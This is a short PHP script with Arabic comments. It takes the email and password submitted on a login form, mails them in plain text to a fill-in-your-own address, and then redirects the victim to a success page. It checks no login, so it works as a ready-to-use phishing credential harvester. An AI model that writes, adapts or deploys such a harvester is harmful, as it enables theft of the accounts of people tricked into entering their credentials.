<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // احصل على بيانات النموذج المقدمة
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // بناء الرسالة
    $to = "your_email@example.com"; // حدد عنوان بريدك الإلكتروني هنا
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;
    
    // إرسال البريد الإلكتروني
    mail($to, $subject, $message);
    
    // قم بتوجيه المستخدم إلى صفحة أخرى بعد إرسال البريد الإلكتروني
    header("Location: success.html"); // قم بتغيير اسم الملف إلى الصفحة التي ترغب في توجيه المستخدم إليها بعد إرسال البريد الإلكتروني
    exit;
}
?>
